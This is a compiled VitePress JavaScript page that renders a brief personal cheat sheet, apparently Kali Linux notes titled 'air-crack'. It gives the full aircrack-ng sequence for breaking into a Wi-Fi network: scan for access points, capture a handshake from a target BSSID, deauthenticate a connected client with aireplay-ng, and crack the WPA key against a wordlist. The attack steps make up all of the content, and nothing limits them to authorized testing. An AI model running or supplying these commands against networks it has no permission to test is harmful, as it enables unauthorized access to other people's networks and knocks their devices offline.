import{_ as s,c as n,o as e,ah as l}from"./chunks/framework.BrJYEL96.js";const u=JSON.parse('{"title":"air-crack","description":"","frontmatter":{},"headers":[],"relativePath":"Linux/kali/air-crack.md","filePath":"Linux/kali/air-crack.md","lastUpdated":1737275780000}'),o={name:"Linux/kali/air-crack.md"};function p(r,a,c,t,i,d){return e(),n("div",null,a[0]||(a[0]=[l('<h1 id="air-crack" tabindex="-1">air-crack <a class="header-anchor" href="#air-crack" aria-label="Permalink to &quot;air-crack&quot;">​</a></h1><ul><li><p>扫描信号</p><div class="language-sh line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sh</span><pre class="shiki one-dark-pro vp-code" style="background-color:#282c34;color:#abb2bf;" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">airodump-ng</span><span style="color:#D19A66;"> -a</span><span style="color:#D19A66;"> --essid-regex</span><span style="color:#98C379;"> &quot;[^CAAS|CASTP|castp|caas|castp2|BRI_CAAS|DIRECT]&quot;</span><span style="color:#98C379;"> wlan0mon</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>抓包</p></li><li><div class="language-sh line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sh</span><pre class="shiki one-dark-pro vp-code" style="background-color:#282c34;color:#abb2bf;" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">airodump-ng</span><span style="color:#D19A66;"> -c</span><span style="color:#D19A66;"> 11</span><span style="color:#D19A66;"> --bssid</span><span style="color:#98C379;"> mac</span><span style="color:#D19A66;"> -w</span><span style="color:#98C379;"> /root/shake</span><span style="color:#98C379;"> wlan0mon</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>ACK</p><div class="language-sh line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sh</span><pre class="shiki one-dark-pro vp-code" style="background-color:#282c34;color:#abb2bf;" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">aireplay-ng</span><span style="color:#D19A66;"> -0</span><span style="color:#D19A66;"> 10</span><span style="color:#D19A66;"> -a</span><span style="color:#98C379;"> net-mac</span><span style="color:#D19A66;"> -c</span><span style="color:#98C379;"> c-mac</span><span style="color:#98C379;"> wlan0mon</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>Crack</p><div class="language-sh line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sh</span><pre class="shiki one-dark-pro vp-code" style="background-color:#282c34;color:#abb2bf;" tabindex="0"><code><span class="line"><span style="color:#61AFEF;">aircrack-ng</span><span style="color:#D19A66;"> -w</span><span style="color:#98C379;"> pass.txt</span><span style="color:#D19A66;"> -b</span><span style="color:#98C379;"> mac</span><span style="color:#98C379;"> ./shake-01.cap</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div></li></ul>',2)]))}const y=s(o,[["render",p]]);export{u as __pageData,y as default};
